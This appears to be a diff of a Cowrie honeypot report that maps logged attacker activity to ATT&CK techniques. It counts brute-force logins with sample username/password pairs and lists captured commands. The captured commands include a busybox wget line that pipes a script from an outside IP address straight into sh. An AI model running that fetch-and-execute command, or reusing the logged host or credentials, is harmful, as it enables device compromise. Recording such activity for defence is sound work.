@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-28 00:03:44",
+  "generated": "2026-08-28 01:00:11",
   "totals": {
-    "commands": 2,
-    "login_failed": 5,
-    "login_success": 1,
-    "sessions": 7
+    "commands": 11,
+    "login_failed": 42,
+    "login_success": 2,
+    "sessions": 83
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5,
+      "count": 42,
       "examples": [
         "root / 0033",
         "root / 12345678",
@@ -21,20 +21,35 @@
         "root / 123456789"
       ],
       "first": "2026-08-28T00:00:26.408142Z",
-      "last": "2026-08-28T00:02:58.364069Z",
-      "unique_ips": 4
+      "last": "2026-08-28T00:59:50.524932Z",
+      "unique_ips": 10
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 3,
+      "examples": [
+        "/bin/busybox wget; /bin/busybox STC",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
+        "http://2.26.136.128/twget.sh"
+      ],
+      "first": "2026-08-28T00:51:50.759248Z",
+      "last": "2026-08-28T00:51:54.496529Z",
+      "unique_ips": 1
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1,
+      "count": 2,
       "examples": [
-        "superadmin / Is$uper@dmin"
+        "superadmin / Is$uper@dmin",
+        "admin / admin"
       ],
       "first": "2026-08-28T00:01:52.110632Z",
-      "last": "2026-08-28T00:01:52.110632Z",
-      "unique_ips": 1
+      "last": "2026-08-28T00:51:46.812375Z",
+      "unique_ips": 2
     }
   ],
   "unmapped": [
@@ -44,6 +59,34 @@
     ],
     [
       "cd /proc && cat self/cmdline",
+      1
+    ],
+    [
+      "sh",
+      1
+    ],
+    [
+      "shell",
+      1
+    ],
+    [
+      "enable",
+      1
+    ],
+    [
+      "system",
+      1
+    ],
+    [
+      "ping; sh",
+      1
+    ],
+    [
+      "/bin/busybox STC",
+      1
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
       1
     ]
   ]
